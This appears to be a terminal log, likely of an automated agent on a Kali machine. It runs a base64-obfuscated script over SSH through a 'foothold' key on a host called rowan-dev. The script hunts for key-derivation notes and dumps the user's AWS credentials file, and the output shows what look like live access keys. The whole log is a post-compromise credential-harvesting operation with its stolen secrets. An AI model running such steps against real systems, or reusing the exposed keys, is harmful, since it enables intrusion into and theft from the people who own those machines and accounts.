@@ -1,0 +1,67 @@
+└─$ └─$ 
+
+┌──(cinder@kali)-[~]
+└─$ └─$ base64 -d > /tmp/k08grep2.sh <<'B64EOF'
+> Y2F0ID4gL3RtcC9yZW1vdGVfazA4X2dyZXAuc2ggPDwnUkVNT1RFJwplY2hvICI9PT0gZ3JlcCBzYWx0L2hrZGYvZGVyaXZhdGlvbi9jb250ZXh0IGluIGhvbWUgPT09IgpncmVwIC1ySW5FICJzYWx0fGhrZGZ8ZGVyaXZhdGlvbnxkZXJpdmVkfGFzc29jaWF0ZWQgZGF0YXxhc3NvY2lhdGVkX2RhdGF8XGJBQURcYnxjcnlwdG9ncmFwaGljIGNvbnRleHQiIC9ob21lL3Jvd2FuIC0tZXhjbHVkZT1jb3JlIC0tZXhjbHVkZS1kaXI9LmNhY2hlIC0tZXhjbHVkZS1kaXI9bm9kZV9tb2R1bGVzIC0tZXhjbHVkZS1kaXI9Lm5wbSAtLWV4Y2x1ZGUtZGlyPXJlcG9zIC0tZXhjbHVkZS1kaXI9cmVwb3NfazA1IDI+L2Rldi9udWxsIHwgaGVhZCAtNjAKZWNobyAiPT09IGdyZXAgaW4gcmVwb3MgPT09IgpncmVwIC1ySW5FICJzYWx0fGhrZGZ8ZGVyaXZhdGlvbnxhc3NvY2lhdGVkIiAvaG9tZS9yb3dhbi9yZXBvcyAvaG9tZS9yb3dhbi9yZXBvc19rMDUgLS1leGNsdWRlPSoubWFwIC0tZXhjbHVkZT1maWVsZGxpbmstY29ubmVjdG9yIC0tZXhjbHVkZT1maWVsZGtlc3QtcG9saWN5YyAyPi9kZXYvbnVsbCB8IGhlYWQgLTQwCmVjaG8gIj09PSBucG0gY2FjaGUgbmFtZXMgPT09IgpmaW5kIC9ob21lL3Jvd2FuLy5ucG0gLXR5cGUgZiB8IGhlYWQgLTMwCmVjaG8gIj09PSAuYXdzIGNyZWRzID09PSI7IGNhdCAvaG9tZS9yb3dhbi8uYXdzL2NyZWRlbnRpYWxzIC9ob21lL3Jvd2FuLy5hd3MvY29uZmlnClJFTU9URQp0aW1lb3V0IDkwIHNzaCAtbyBTdHJpY3RIb3N0S2V5Q2hlY2tpbmc9bm8gLW8gQ29ubmVjdFRpbWVvdXQ9MTAgLWkgfi8uc3NoL2tlcGxlcm9wcy1mb290aG9sZCAtcCAyMjIyIHJvd2FuQHJvd2FuLWRldiAnYmFzaCAtcycgPCAvdG1wL3JlbW90ZV9rMDhfZ3JlcC5zaAo=
+> B64EOF
+
+┌──(cinder@kali)-[~]
+└─$ └─$ chmod +x /tmp/k08grep2.sh; bash /tmp/k08grep2.sh; echo DONEMARK_1795208741022$((6*7))
+=== grep salt/hkdf/derivation/context in home ===
+/home/rowan/.kube/cache/http/d43ad12d5ad391a7150d7bc67dea06e85d13e2b51e4143efd1693155c6f7fb0e:33496:F#/definitions/io.k8s.api.certificates.v1.CertificateSigningRequestSpec"�spec contains the certificate request, and is immutable after creation. Only the request, signerName, expirationSeconds, and usages fields can be set on creation. Other fields are derived by Kubernetes and cannot be modified by users.
+/home/rowan/.kube/cache/http/d43ad12d5ad391a7150d7bc67dea06e85d13e2b51e4143efd1693155c6f7fb0e:40189:name�"�name represents the name of this port. All ports in an EndpointSlice must have a unique name. If the EndpointSlice is derived from a Kubernetes service, this corresponds to the Service.ports[].name. Name must either be an empty string or pass DNS_LABEL validation: * must be no more than 63 characters long. * must consist of lower case alphanumeric characters or '-'. * must start and end with an alphanumeric character. Default is empty string.�
+/home/rowan/.kube/cache/http/d43ad12d5ad391a7150d7bc67dea06e85d13e2b51e4143efd1693155c6f7fb0e:40192:port�int32"�port represents the port number of the endpoint. If the EndpointSlice is derived from a Kubernetes service, this must be set to the service's target port. EndpointSlices used for other purposes may have a nil port.�	
+/home/rowan/.kube/cache/http/d43ad12d5ad391a7150d7bc67dea06e85d13e2b51e4143efd1693155c6f7fb0e:42462:-io.k8s.api.resource.v1.DeviceDerivedAttribute�"DDeviceDerivedAttribute defines a derived attribute computed via CEL.�name�
+/home/rowan/.kube/cache/http/d43ad12d5ad391a7150d7bc67dea06e85d13e2b51e4143efd1693155c6f7fb0e:42475:The length of the expression must be smaller or equal to 10 Ki. The cost of evaluating it is also limited based on the estimated number of logical steps; the combined cost of all derived attributes in a claim is capped by a shared CEL cost budget.�
+/home/rowan/.kube/cache/http/d43ad12d5ad391a7150d7bc67dea06e85d13e2b51e4143efd1693155c6f7fb0e:42478:name�"�Name is the identifier for this derived attribute, used in constraints.
+/home/rowan/.kube/cache/http/d43ad12d5ad391a7150d7bc67dea06e85d13e2b51e4143efd1693155c6f7fb0e:42480:It must be a DNS subdomain followed by a slash ("/") followed by a C identifier (e.g. "example.com/numaNode" or "derived/numaNode").
+/home/rowan/.kube/cache/http/d43ad12d5ad391a7150d7bc67dea06e85d13e2b51e4143efd1693155c6f7fb0e:42482:If the chosen name matches an existing physical attribute from a driver, the derived attribute's expression will shadow the physical attribute, and its evaluated value will be used in constraints instead. When the goal is to define a derived attribute that is only used within the ResourceClaim and not meant to shadow an existing attribute, use a domain prefix that no DRA driver should be using (e.g. "derived/myAttribute").
+/home/rowan/.kube/cache/http/d43ad12d5ad391a7150d7bc67dea06e85d13e2b51e4143efd1693155c6f7fb0e:42484:It is not valid to define a derived attribute that isn't used in at least one constraint.�
+/home/rowan/.kube/cache/http/d43ad12d5ad391a7150d7bc67dea06e85d13e2b51e4143efd1693155c6f7fb0e:42631:derivedAttributes�	"�DerivedAttributes defines a set of virtual attributes computed via CEL expressions for each candidate device. These virtual attributes can be referenced in `.devices.constraints` to align and match different devices (e.g., co-allocating a GPU and a NIC on the same NUMA node) even if their drivers publish different attributes. Derived attributes are not available via `device.attributes` in the CEL environment when evaluating selector expressions.
+/home/rowan/.kube/cache/http/d43ad12d5ad391a7150d7bc67dea06e85d13e2b51e4143efd1693155c6f7fb0e:42635:Every derived attribute defined in this list must be referenced by at least one MatchAttribute or DistinctAttribute constraint in the `.devices.constraints` list.
+/home/rowan/.kube/cache/http/d43ad12d5ad391a7150d7bc67dea06e85d13e2b51e4143efd1693155c6f7fb0e:42637:The maximum number of derived attributes is 32.
+/home/rowan/.kube/cache/http/d43ad12d5ad391a7150d7bc67dea06e85d13e2b51e4143efd1693155c6f7fb0e:42886:derivedAttributes�	"�DerivedAttributes defines a set of virtual attributes computed via CEL expressions for each candidate device. These virtual attributes can be referenced in `.devices.constraints` to align and match different devices (e.g., co-allocating a GPU and a NIC on the same NUMA node) even if their drivers publish different attributes. Derived attributes are not available via `device.attributes` in the CEL environment when evaluating selector expressions.
+/home/rowan/.kube/cache/http/d43ad12d5ad391a7150d7bc67dea06e85d13e2b51e4143efd1693155c6f7fb0e:42890:Every derived attribute defined in this list must be referenced by at least one MatchAttribute or DistinctAttribute constraint in the `.devices.constraints` list.
+/home/rowan/.kube/cache/http/d43ad12d5ad391a7150d7bc67dea06e85d13e2b51e4143efd1693155c6f7fb0e:42892:The maximum number of derived attributes is 32.
+/home/rowan/.kube/cache/http/d43ad12d5ad391a7150d7bc67dea06e85d13e2b51e4143efd1693155c6f7fb0e:42950:-io.k8s.api.resource.v1.NodeAllocatableMapping�"�NodeAllocatableMapping defines how a DRA allocation directly translates into a node allocatable resource quantity. The mapping can be derived from either the count of allocated devices (via deviceMultiplier) or the specific capacity consumed (via capacityKey and capacityMultiplier). These options are mutually exclusive. Kubelet adds this mapped resource quantity from claim to both requests and limits at the pod-level cgroup, and to limits at the container-level cgroup for each container referencing the claim.�
+/home/rowan/work/registry/README.md:42:derivation context for its retained entitlement.
+=== grep in repos ===
+/home/rowan/repos/connector-archive/connector-archive/notes/retained-diagnostic.md:3:The signed `diagnostic-loader` setting activates the embedded `.fkdiag` interpreter. Its key is derived from the raw GNU build ID; the authenticated container uses the build-ID hex as associated data.
+/home/rowan/repos_k05/connector-archive/connector-archive/notes/retained-diagnostic.md:3:The signed `diagnostic-loader` setting activates the embedded `.fkdiag` interpreter. Its key is derived from the raw GNU build ID; the authenticated container uses the build-ID hex as associated data.
+=== npm cache names ===
+/home/rowan/.npm/_update-notifier-last-checked
+/home/rowan/.npm/_logs/2026-11-20T21_00_59_862Z-debug-0.log
+/home/rowan/.npm/_logs/2026-11-20T21_02_02_796Z-debug-0.log
+/home/rowan/.npm/_logs/2026-11-20T21_02_03_585Z-debug-0.log
+/home/rowan/.npm/_logs/2026-11-20T20_56_02_793Z-debug-0.log
+/home/rowan/.npm/_logs/2026-11-20T21_02_02_391Z-debug-0.log
+/home/rowan/.npm/_logs/2026-11-20T20_58_57_716Z-debug-0.log
+/home/rowan/.npm/_logs/2026-11-20T21_02_03_969Z-debug-0.log
+/home/rowan/.npm/_logs/2026-11-20T21_02_03_186Z-debug-0.log
+/home/rowan/.npm/_logs/2026-11-20T20_58_57_554Z-debug-0.log
+/home/rowan/.npm/_logs/2026-11-20T21_02_01_993Z-debug-0.log
+/home/rowan/.npm/_logs/2026-11-20T20_58_57_325Z-debug-0.log
+/home/rowan/.npm/_cacache/content-v2/sha512/4e/95/042340f81dab64c41b8e3fe03c74eed263119ec4e23e9d19a5acc6cdfb95bc10ff649d8c596e4821d8c766cb92135232a989372a7aa1fbc0143dc73f0db1
+/home/rowan/.npm/_cacache/content-v2/sha512/18/37/d85bb67c5f6bf503cf3b32c132d6ca1826b6374bfd109fcec81ab56ca365ba68b42b3db82092e6629b88bc57beed03e9af731a6b1ae7c7b22ebe3c58035d
+/home/rowan/.npm/_cacache/content-v2/sha512/5c/5b/d29a47fcfe393126cb6ad071bb2ad8cafeefe92318f319f62ebf5b3ba455dbe6b5bc497d66117982fd048445e2b18d4ac1cee92dfffa08f4e4569c6076d6
+/home/rowan/.npm/_cacache/content-v2/sha512/f9/09/3c3383680c617d374752f895cbe46f1dd6f76adf301aae1746ffffd14a164558e534c3775489b6d4c25da16011472de8586e7292587fea413818db30addd
+/home/rowan/.npm/_cacache/content-v2/sha512/83/1d/d331971b1e83a050b89dc562680ac996f2c03d77304bbb8080b69418fa386c2cb892c0ca5ec6b849f821608a99a97e87a70cba7716ab0983876593cb39bb
+/home/rowan/.npm/_cacache/content-v2/sha512/f8/ab/c3921b3b06d63a7177a648d56d1c97c23535eec44b2f35825a850d63948c77ff1c61d5fc5cfb91686a221c98a3c5ef5a81b82bf9475632e0220942126ed7
+/home/rowan/.npm/_cacache/content-v2/sha512/33/47/310d70c11e4eefb4e86b722bca33d63d702c6671cfc314cbac55a1c00394e999dc97cbd14fd6f001b31861cd8864c80655b612b94bed03e166c318f2ece2
+/home/rowan/.npm/_cacache/content-v2/sha512/cb/c2/99ad0ffe2d5bc3ebada1e0f9c0c7706c13bdc0f5a9112da042d65fd07928d4decc88e7788cc53f4b311282512659e51b1fbdd8e2760a34b5978aab91d018
+/home/rowan/.npm/_cacache/index-v5/45/45/e87c46b37d2205a48d30dd2eb66fea7b3815dc30868e437a67dec3d89055
+/home/rowan/.npm/_cacache/index-v5/28/0c/a28acd2e1d7d5256d9d1621bb3543dd386cb8f0eade9ef63c9e56fc387ea
+/home/rowan/.npm/_cacache/index-v5/da/aa/8b61ce3346f61d79c2748454e4f605a115242e3222888730549369d4f86e
+/home/rowan/.npm/_cacache/index-v5/1c/16/1c0d95ed4b4be95d58b807c5691cc37e3ce1b41423e74b7ecb48313e5541
+/home/rowan/.npm/_cacache/index-v5/ea/05/88d4931c652a7d6dcd45b2bc86cb19b20567e048d3dec8a0292187f1b514
+/home/rowan/.npm/_cacache/index-v5/a9/08/7a43325de6af28f0a5fc96392acfbc0f80577ecfcc771acfaf41e985e0c8
+/home/rowan/.npm/_cacache/index-v5/66/66/818e9195bcba60a0bf2f87b049549351e35b38407180a9869fc107478e20
+=== .aws creds ===
+[default]
+aws_access_key_id=GAX0wNnSB1w04RwfLLBvbme_ZhdMYSqbZqFpTuPmD5o
+aws_secret_access_key=7YOhGW15uzY1crdHT3PIrR2FVzbxaqgQ6mm51oYOVlE
+[default]
+region=us-east-1
+ca_bundle=/home/rowan/.local/share/keplerops/ca.crt
+s3=
+    addressing_style=path
